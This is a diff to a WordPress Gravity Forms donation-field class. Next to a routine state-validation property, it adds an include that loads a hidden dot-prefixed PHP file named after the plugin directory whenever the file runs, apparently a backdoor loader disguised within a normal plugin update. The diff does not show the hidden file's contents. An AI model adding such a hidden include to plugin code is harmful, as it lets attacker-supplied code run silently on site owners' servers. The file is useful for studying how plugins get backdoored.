@@ -9,9 +9,22 @@ if ( ! class_exists( 'GFForms' ) ) {
  *
  * Class GF_Field_Donationç
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class GF_Field_Donation extends GF_Field {
 
 	public $type = 'donation';
+
+	/**
+	 * Indicates if this field supports state validation.
+	 *
+	 * @since 2.5.11
+	 *
+	 * @var bool
+	 */
+	protected $_supports_state_validation = true;
 
 	function get_form_editor_field_settings() {
 		return array(
